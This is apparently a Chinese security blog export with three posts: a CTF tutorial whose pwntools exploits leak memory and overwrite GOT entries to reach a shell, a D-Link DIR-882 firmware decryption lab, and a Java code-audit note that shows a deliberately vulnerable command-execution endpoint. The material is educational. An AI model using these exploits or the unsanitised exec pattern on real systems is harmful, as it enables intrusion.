<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>这里，我们以 2017 年的 UIUCTF 中 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a> 为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个 flag.txt 文件。</p>
<h4 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ checksec goodluck       </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看出程序开启了 NX 保护以及部分 RELRO 保护</p>
<h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><p>可以发现，程序的漏洞很明显</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for ( j &#x3D; 0; j &lt;&#x3D; 21; ++j )</span><br><span class="line"> &#123;</span><br><span class="line">   v5 &#x3D; format[j];</span><br><span class="line">   if ( !v5 || v11[j] !&#x3D; v5 )</span><br><span class="line">   &#123;</span><br><span class="line">     puts(&quot;You answered:&quot;);</span><br><span class="line">     printf(format);</span><br><span class="line">     puts(&quot;\nBut that was totally wrong lol get rekt&quot;);</span><br><span class="line">     fflush(_bss_start);</span><br><span class="line">     result &#x3D; 0;</span><br><span class="line">     goto LABEL_11;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h4 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h4><p>我们在 printf 处下偏移如下, 这里只关注代码部分与栈部分。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  b printf</span><br><span class="line">Breakpoint 1 at 0x400640</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: &#x2F;mnt&#x2F;hgfs&#x2F;Hack&#x2F;ctf&#x2F;ctf-wiki&#x2F;pwn&#x2F;fmtstr&#x2F;example&#x2F;2017-UIUCTF-pwn200-GoodLuck&#x2F;goodluck </span><br><span class="line">what&#39;s the flag</span><br><span class="line">123456</span><br><span class="line">You answered:</span><br><span class="line"></span><br><span class="line">Breakpoint 1, __printf (format&#x3D;0x602830 &quot;123456&quot;) at printf.c:28</span><br><span class="line">28  printf.c: 没有那个文件或目录.</span><br><span class="line"></span><br><span class="line">─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────</span><br><span class="line">   0x7ffff7a627f7 &lt;fprintf+135&gt;    add    rsp, 0xd8</span><br><span class="line">   0x7ffff7a627fe &lt;fprintf+142&gt;    ret    </span><br><span class="line">   0x7ffff7a627ff                  nop    </span><br><span class="line"> → 0x7ffff7a62800 &lt;printf+0&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7a62807 &lt;printf+7&gt;       test   al, al</span><br><span class="line">   0x7ffff7a62809 &lt;printf+9&gt;       mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7a6280e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">───────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0x7fffffffdb08&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0x00007fffffffdb08│+0x00: 0x0000000000400890  →  &lt;main+234&gt; mov edi, 0x4009b8    ← $rsp</span><br><span class="line">0x00007fffffffdb10│+0x08: 0x0000000031000001</span><br><span class="line">0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 (&quot;123456&quot;?)</span><br><span class="line">0x00007fffffffdb20│+0x18: 0x0000000000602010  →  &quot;You answered:\ng&quot;</span><br><span class="line">0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  &quot;flag&#123;11111111111111111&quot;</span><br><span class="line">0x00007fffffffdb30│+0x28: &quot;flag&#123;11111111111111111&quot;</span><br><span class="line">0x00007fffffffdb38│+0x30: &quot;11111111111111&quot;</span><br><span class="line">0x00007fffffffdb40│+0x38: 0x0000313131313131 (&quot;111111&quot;?)</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">[#0] 0x7ffff7a62800 → Name: __printf(format&#x3D;0x602830 &quot;123456&quot;)</span><br><span class="line">[#1] 0x400890 → Name: main()</span><br></pre></td></tr></table></figure>

<p>以看到 flag 对应的栈上的偏移为 5，除去对应的第一行为返回地址外，其偏移为 4。此外，由于这是一个 64 位程序，所以前 6 个参数存在在对应的寄存器中，fmt 字符串存储在 RDI 寄存器中，所以 fmt 字符串对应的地址的偏移为 10。而 fmt 字符串中 <code>%order$s</code> 对应的 order 为 fmt 字符串后面的参数的顺序，所以我们只需要输入 <code>%9$s</code> 即可得到 flag 的内容。当然，我们还有更简单的方法利用 <a href="https://github.com/scwuaptx/Pwngdb">https://github.com/scwuaptx/Pwngdb</a> 中的 fmtarg 来判断某个参数的偏移。</p>
<p><strong>ps:这里的10是由5+5得到的，至于为什么是这两个5是从哪里的得到的，我来解释一下，前面的5: 由于64为程序，前64个参数是存在寄存器中的，分别是rdi, rsi, rcx, rdx, r8, r9 所以第一格式化字符串是存储rdi中的，所以flag对应的偏移就应该是在 5 + flag 在线中的偏移，在栈中的偏移就很多理解了就是5，所以flag对应的格式化字符串偏移为10</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  fmtarg 0x00007fffffffdb28</span><br><span class="line">The index of format argument : 10 (&quot;\%9$p&quot;)</span><br></pre></td></tr></table></figure>

<p>需要注意的是我们必须 break 在 printf 处。</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">goodluck &#x3D; ELF(&#39;.&#x2F;goodluck&#39;)</span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    sh &#x3D; remote(&#39;pwn.sniperoj.cn&#39;, 30017)</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(&#39;.&#x2F;goodluck&#39;)</span><br><span class="line">payload &#x3D; &quot;%9$s&quot;</span><br><span class="line">print payload</span><br><span class="line">##gdb.attach(sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">print sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] Starting local process &#39;.&#x2F;goodluck&#39;: pid 3129</span><br><span class="line">%9$s</span><br><span class="line">[*] Process &#39;.&#x2F;goodluck&#39; stopped with exit code 0 (pid 3129)</span><br><span class="line">what&#39;s the flag</span><br><span class="line">You answered:</span><br><span class="line">flag&#123;11111111111111&#125;</span><br><span class="line">\xff</span><br><span class="line">But that was totally wrong lol get rekt</span><br></pre></td></tr></table></figure>

<h2 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p>
<p>假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤</p>
<ul>
<li><p>确定函数 A 的 GOT 表地址。</p>
<ul>
<li>这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。</li>
</ul>
</li>
<li><p>确定函数 B 的内存地址</p>
<ul>
<li>这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</li>
</ul>
</li>
<li><p>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。</p>
<ul>
<li><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p>
<ul>
<li>写入函数：write 函数。</li>
<li>ROP</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop eax; ret;           # printf@got -&gt; eax</span><br><span class="line">pop ebx; ret;           # (addr_offset &#x3D; system_addr - printf_addr) -&gt; ebx</span><br><span class="line">add [eax] ebx; ret;     # [printf@got] &#x3D; [printf@got] + addr_offset</span><br></pre></td></tr></table></figure>

<ul>
<li>格式化字符串任意地址写</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><p>这里我们以 2016 CCTF 中的 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3">pwn3</a> 为例进行介绍。</p>
<h4 id="查看保护-1"><a href="#查看保护-1" class="headerlink" title="查看保护"></a>查看保护</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;pwn3&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>可以看出程序主要开启了 NX 保护。我们一般默认远程都是开启 ASLR 保护的。</p>
<h4 id="分析程序-1"><a href="#分析程序-1" class="headerlink" title="分析程序"></a>分析程序</h4><p>首先分析程序，可以发现程序似乎主要实现了一个需密码登录的 ftp，具有 get，put，dir 三个基本功能。大概浏览一下每个功能的代码，发现在 get 功能中存在格式化字符串漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int get_file()</span><br><span class="line">&#123;</span><br><span class="line">  char dest; &#x2F;&#x2F; [sp+1Ch] [bp-FCh]@5</span><br><span class="line">  char s1; &#x2F;&#x2F; [sp+E4h] [bp-34h]@1</span><br><span class="line">  char *i; &#x2F;&#x2F; [sp+10Ch] [bp-Ch]@3</span><br><span class="line"></span><br><span class="line">  printf(&quot;enter the file name you want to get:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%40s&quot;, &amp;s1);</span><br><span class="line">  if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) )</span><br><span class="line">    puts(&quot;too young, too simple&quot;);</span><br><span class="line">  for ( i &#x3D; (char *)file_head; i; i &#x3D; (char *)*((_DWORD *)i + 60) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strcmp(i, &amp;s1) )</span><br><span class="line">    &#123;</span><br><span class="line">      strcpy(&amp;dest, i + 0x28);</span><br><span class="line">      return printf(&amp;dest);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return printf(&amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h4><p>既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路</p>
<ul>
<li>绕过密码</li>
<li>确定格式化字符串参数偏移</li>
<li>利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。</li>
<li>修改 puts@got 的内容为 system 的地址。</li>
<li>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</li>
</ul>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">##context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">pwn3 &#x3D; ELF(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    sh &#x3D; remote(&#39;111&#39;, 111)</span><br><span class="line">else:</span><br><span class="line">    sh &#x3D; process(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get(name):</span><br><span class="line">    sh.sendline(&#39;get&#39;)</span><br><span class="line">    sh.recvuntil(&#39;enter the file name you want to get:&#39;)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    data &#x3D; sh.recv()</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def put(name, content):</span><br><span class="line">    sh.sendline(&#39;put&#39;)</span><br><span class="line">    sh.recvuntil(&#39;please enter the name of the file you want to upload:&#39;)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    sh.recvuntil(&#39;then, enter the content:&#39;)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show_dir():</span><br><span class="line">    sh.sendline(&#39;dir&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tmp &#x3D; &#39;sysbdmin&#39;</span><br><span class="line">name &#x3D; &quot;&quot;</span><br><span class="line">for i in tmp:</span><br><span class="line">    name +&#x3D; chr(ord(i) - 1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## password</span><br><span class="line">def password():</span><br><span class="line">    sh.recvuntil(&#39;Name (ftp.hacker.server:Rainism):&#39;)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##password</span><br><span class="line">password()</span><br><span class="line">## get the addr of puts</span><br><span class="line">puts_got &#x3D; pwn3.got[&#39;puts&#39;]</span><br><span class="line">log.success(&#39;puts got : &#39; + hex(puts_got))</span><br><span class="line">put(&#39;1111&#39;, &#39;%8$s&#39; + p32(puts_got))</span><br><span class="line">puts_addr &#x3D; u32(get(&#39;1111&#39;)[:4])</span><br><span class="line"></span><br><span class="line">## get addr of system</span><br><span class="line">libc &#x3D; LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="line">system_offset &#x3D; libc.dump(&#39;system&#39;)</span><br><span class="line">puts_offset &#x3D; libc.dump(&#39;puts&#39;)</span><br><span class="line">system_addr &#x3D; puts_addr - puts_offset + system_offset</span><br><span class="line">log.success(&#39;system addr : &#39; + hex(system_addr))</span><br><span class="line"></span><br><span class="line">## modify puts@got, point to system_addr</span><br><span class="line">payload &#x3D; fmtstr_payload(7, &#123;puts_got: system_addr&#125;)</span><br><span class="line">put(&#39;&#x2F;bin&#x2F;sh;&#39;, payload)</span><br><span class="line">sh.recvuntil(&#39;ftp&gt;&#39;)</span><br><span class="line">sh.sendline(&#39;get&#39;)</span><br><span class="line">sh.recvuntil(&#39;enter the file name you want to get:&#39;)</span><br><span class="line">##gdb.attach(sh)</span><br><span class="line">sh.sendline(&#39;&#x2F;bin&#x2F;sh;&#39;)</span><br><span class="line"></span><br><span class="line">## system(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">show_dir()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul>
<li>我在获取 puts 函数地址时使用的偏移是 8，这是因为我希望我输出的前 4 个字节就是 puts 函数的地址。其实格式化字符串的首地址的偏移是 7。</li>
<li>这里我利用了 pwntools 中的 fmtstr_payload 函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里 fmtstr_payload(7, {puts_got: system_addr}) 的意思就是，我的格式化字符串的偏移是 7，我希望在 puts_got 地址处写入 system_addr 地址。默认情况下是按照字节来写的。</li>
</ul>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>格式化字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>D-Link DIR-882固件解密实验</title>
    <url>/2021/03/10/IOT/D-Link-DIR-882%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h1 id="0x01-实验目的"><a href="#0x01-实验目的" class="headerlink" title="0x01 实验目的"></a>0x01 实验目的</h1><blockquote>
<p>通过本次实验学习，如何在固件被加密的情况下进行解密，使得固件层面的 路由器安全研究顺利进行</p>
</blockquote>
<h1 id="0x02-概述"><a href="#0x02-概述" class="headerlink" title="0x02 概述"></a>0x02 概述</h1><p>固件升级的一种方案 随着物联网安全安全越来越重视，作为万物互联的核心之一—路由器的安全也越 来越重视，反映在固件方面，就是其针对附件做的一些安全措施，可以使得一些 安全研究员手足无措，不过由于一些历史原因，很可能我们可以通过分析固件的 之前的一些版本，找到研究固件当前版本的一些线索。 下面这张图</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310145532897.png" alt="image-20210310145532897"></p>
<p>是很多路由器厂家会采取的一种更新升级固件并使固件更加“安全“的方案。 这个方案是这样的：最开始发布的固件是没有加密的，也没有附带任何解密的文 件，随着固件更新，解密文件会和较新版本 v1.1 中的未加密版本一起发布，以 便将来进行固件加密，v1.1 版本作为过渡使用。而到了 v1.2 时，固件则是以加 密形式发布的，不过仍附带解密文件。</p>
<a id="more"></a>

<h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><p>服务器：attify os</p>
<p>辅助工具：firmwalk.sh(以及3个固件都在附件里)</p>
<h1 id="0x04-实验操作"><a href="#0x04-实验操作" class="headerlink" title="0x04 实验操作"></a>0x04 实验操作</h1><p>在本次实验中，我们首先将研究路由器固件升级常见的一种方案，并找到该方案 的漏洞所在，通过实际分析相关的几个固件，最后对新版加密固件的文件系统的 提取。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名：iot 密码：attify</span><br><span class="line">数据库：postgre 密码：firmadyne</span><br></pre></td></tr></table></figure>

<p>这次的实验，我们以 D-Link DIR-882 固件为例。我们在分析固件时会发现它被 加密过了，使用 binwalk 根本无法探测，比如这次的固件 <code>v1.20b06</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310151511835.png" alt="image-20210310151511835"></p>
<p>这时候我们可以考虑通过分析旧版本的固件尝试是否有什么线索来解密现在这 个新版本的固件 在 这 里 我 们 可 以 找 到 所 有 旧 版 本 的 固 件 （ <a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/">ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/</a> ） ， 我 们 找 个 最 早 的 版 本 v1.00b07，下载来后解压尝试binwalk读取</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310151552125.png" alt="image-20210310151552125"></p>
<p>可以看到能识别出信息，或者说是没有加密过的。 那再看看稍微新一点的版本</p>
<p><code>v1.10b02</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310151718892.png" alt="image-20210310151718892"></p>
<p>可以看到有两个 bin 文件，说明 1.04b02 的过渡版本，它包含在 v1.10b02 固件包 汇中，名字也已经告诉我们了，1.04b02 是未加密的 分别使用 binwalk</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152045023.png" alt="image-20210310152045023"></p>
<p>而加密后的固件却什么也看不到</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152141476.png" alt="image-20210310152141476"></p>
<p>我们把 1.04b02 提取出来</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152258117.png" alt="image-20210310152258117"></p>
<p>进入生成的文件夹</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152409226.png" alt="image-20210310152409226"></p>
<p>注意到有两个文件，使用 binwalk 提取 A0 进入新文件夹 再次提取8AB758最近进入文件夹</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310152655387.png" alt="image-20210310152655387"></p>
<p>注意到这里有一个 Imgdecrypt 的文件，看名字，应该是用来解密镜像的 file 查看</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310153928160.png" alt="image-20210310153011754"></p>
<p>发现是个可执行文件，尝试执行，缺少相应的 so 文件，这很正常，因为这个文 件是写在 mips 架构上运行的，而我们目前是 x86 为了运行它，我们使用 qemy-mipsel-static</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310153011754.png" alt="image-20210310153011754"></p>
<p>首先将其复制到固件根文件系统的/usr/bin 目录下 在将前面发现是加密的固件 1.20b06 复制过来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo chroot . .&#x2F;qemu-mipsel-static .&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310153928160.png" alt="image-20210310153928160"></p>
<p>接着还是同样的办法模拟 mips 架构拿到 shell 此时再执行 imgdecrypt 可以看到 打印出了使用方法 按照其提示，可以看到对原来加密的固件进行了解密 操作如上图所示 这时候再次使用 binwalk 查看被解密后的固件，可以看到已经可以识别了</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310154124223.png" alt="image-20210310154124223"></p>
<p>这给我们的启示就是，在碰到加密的固件时，可以考率查找位于同一产品线、具 有相同处理器体系结构的路由器固件，找那些版本旧一些的，或者过渡版本，或 许就能为我们提供线索。 我们使用 binwalk 如之前未加密的固件一般一步步提取</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310154715261.png" alt="image-20210310154715261"></p>
<h1 id="0x05-敏感信息分析"><a href="#0x05-敏感信息分析" class="headerlink" title="0x05 敏感信息分析"></a>0x05 敏感信息分析</h1><p>可以看到文件系统都被提取出来了 这里介绍一个常用的小工具 firmwalk.sh 它将搜索固件文件系统，以获取与敏感信息相关的东西，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">etc&#x2F;shadow and etc&#x2F;passwd</span><br><span class="line">列出 etc&#x2F;ssl 目录</span><br><span class="line">搜索相关的文件，如. pem,. crt, 等。</span><br><span class="line">搜索配置文件</span><br><span class="line">查找脚本文件</span><br><span class="line">搜索其他. bin 文件</span><br><span class="line">查找诸如管理员。密码。远程等关键字。</span><br><span class="line">搜索在 IoT 设备上使用的通用网络服务器</span><br><span class="line">搜索常见的二进制文件，如 ssh。tftp。dropbear 等。</span><br><span class="line">搜索网址，电子邮件地址和 IP 地址</span><br></pre></td></tr></table></figure>

<p>我们可以使用它来看看这个文件系统中有哪些敏感信息 命令为./firmwalker.sh 文件系统的路径</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155058406.png" alt="image-20210310155058406"></p>
<p>password关键字文件</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155209933.png" alt="image-20210310155209933" style="zoom:50%;">

<p>ssl相关文件</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155231701.png" alt="image-20210310155231701" style="zoom:50%;">

<p>私钥相关文件</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155302852.png" alt="image-20210310155302852" style="zoom:50%;">

<p>telnel相关文件</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210310155344902.png" alt="image-20210310155344902" style="zoom:50%;">]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>固件</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-sec-code学习记录</title>
    <url>/2021/08/12/WEB/Code_audit/Java-sec-code%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​    最近在搞Java类的代码审计，看到这个项目记录一下自己的学习过程</p>
<h1 id="0x01环境配置"><a href="#0x01环境配置" class="headerlink" title="0x01环境配置"></a>0x01环境配置</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac os 11.2.2</span><br><span class="line">tomcat 8.5</span><br><span class="line">idea</span><br><span class="line">msyql 8.0.70</span><br></pre></td></tr></table></figure>

<p>导入idea项目配置本地tomcat</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;JoyChou93&#x2F;java-sec-code</span><br><span class="line">cd java-sec-code</span><br><span class="line">mvn clean package</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>打开浏览器访问127.0.0.1:8080</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827091208429.png" alt="image-20210827091208429"></p>
<p>输入密码admin/admin123进行登陆</p>
<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="1-Rce"><a href="#1-Rce" class="headerlink" title="1. Rce"></a>1. Rce</h2><h3 id="Java命令执行的几种方式"><a href="#Java命令执行的几种方式" class="headerlink" title="Java命令执行的几种方式"></a>Java命令执行的几种方式</h3><h3 id="1）Runtime-类执行系统命令"><a href="#1）Runtime-类执行系统命令" class="headerlink" title="1）Runtime 类执行系统命令"></a>1）Runtime 类执行系统命令</h3><p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Process p &#x3D; Runtime.getRuntime().exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure>

<p>详细代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Runtime1 &#123;</span><br><span class="line"></span><br><span class="line">       public static void main(String[] args) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Process p &#x3D; Runtime.getRuntime().exec(&quot;whoami&quot;);</span><br><span class="line">                InputStream input &#x3D; p.getInputStream();</span><br><span class="line">                InputStreamReader ins &#x3D; new InputStreamReader(input, &quot;utf-8&quot;);</span><br><span class="line">                &#x2F;&#x2F;InputStreamReader 字节流到字符流，并指定编码格式</span><br><span class="line">                BufferedReader br &#x3D; new BufferedReader(ins);</span><br><span class="line">                &#x2F;&#x2F;BufferedReader 从字符流读取文件并缓存字符</span><br><span class="line">                String line;</span><br><span class="line">                line &#x3D; br.readLine();</span><br><span class="line">                System.out.println(line);</span><br><span class="line">                br.close();</span><br><span class="line">                ins.close();</span><br><span class="line">                input.close();          </span><br><span class="line">                </span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过Runtime类exec方法执行命令获取输入流getInputStream()，再InputStreamReader过渡到字符流，并指定gbk的编码格式。BufferedReader 再从字符输入流中读取文本并缓冲字符。再通过readLine()方法打印出结果。</p>
<p>访问<a href="http://localhost:8080/java_sec_code_war/rce/exec?cmd=whoami">http://localhost:8080/java_sec_code_war/rce/exec?cmd=whoami</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827105713739.png" alt="image-20210827105713739"></p>
<p>查看Rce代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Rce &#123;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;&#x2F;exec&quot;)</span><br><span class="line">    public String CommandExec(String cmd) &#123;</span><br><span class="line">        Runtime run &#x3D; Runtime.getRuntime();</span><br><span class="line">        StringBuilder sb &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Process p &#x3D; run.exec(cmd);</span><br><span class="line">            BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());</span><br><span class="line">            BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                sb.append(tmpStr);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (p.waitFor() !&#x3D; 0) &#123;</span><br><span class="line">                if (p.exitValue() &#x3D;&#x3D; 1)</span><br><span class="line">                    return &quot;Command exec failed!!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            inBr.close();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        return sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Idea调试情况如下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827111228112.png" alt="image-20210827111228112"></p>
<h3 id="2）ProcessBuilder-类命令执行"><a href="#2）ProcessBuilder-类命令执行" class="headerlink" title="2）ProcessBuilder 类命令执行"></a>2）ProcessBuilder 类命令执行</h3><p>ProcessBuilder类通过创建系统进程执行命令。</p>
<p>核心代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ProcessBuilder builder &#x3D; new ProcessBuilder(&quot;whoami&quot;);</span><br><span class="line">Process process &#x3D; builder.start();</span><br></pre></td></tr></table></figure>

<p>详细代码：</p>
